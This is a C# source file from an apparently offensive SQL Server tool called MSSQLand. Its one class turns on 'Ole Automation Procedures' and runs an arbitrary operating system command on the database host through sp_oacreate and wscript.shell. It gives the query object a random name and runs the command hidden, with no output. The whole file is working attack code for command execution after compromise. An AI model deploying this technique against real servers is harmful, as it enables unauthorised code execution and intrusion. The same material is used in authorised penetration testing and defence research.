// MSSQLand/Actions/Execution/Ole.cs

using MSSQLand.Services;
using MSSQLand.Utilities;

namespace MSSQLand.Actions.Execution
{
    internal class Ole : BaseAction
    {
        [ArgumentMetadata(Position = 0, Required = true, Remainder = true, Description = "Operating system command to execute")]
        private string _command = "";

        /// <summary>
        /// Executes the provided command using OLE Automation (fire-and-forget, no output).
        /// </summary>
        /// <param name="databaseContext">The DatabaseContext instance to execute the query.</param>
        /// <returns>0 on success, null on failure.</returns>
        public override object Execute(DatabaseContext databaseContext)
        {
            Logger.Info($"Executing OLE command: {_command}");

            // Ensure 'Ole Automation Procedures' are enabled
            if (!databaseContext.ConfigService.SetConfigurationOption("Ole Automation Procedures", 1))
            {
                Logger.Error("Unable to enable OLE Automation Procedures. Ensure you have the necessary permissions.");
                return null;
            }

            string objVar = ByteHelper.GetRandomIdentifier(6);

            // Escape single quotes in command
            string escapedCommand = _command.Replace("'", "''");

            string query = $@"
DECLARE @{objVar} INT;
EXEC sp_oacreate 'wscript.shell', @{objVar} out;
EXEC sp_oamethod @{objVar}, 'Run', NULL, '{escapedCommand}', 0, 0;
EXEC sp_oadestroy @{objVar}";

            databaseContext.QueryService.ExecuteNonProcessing(query);
            Logger.Success("Executed command");
            return 0;
        }
    }
}
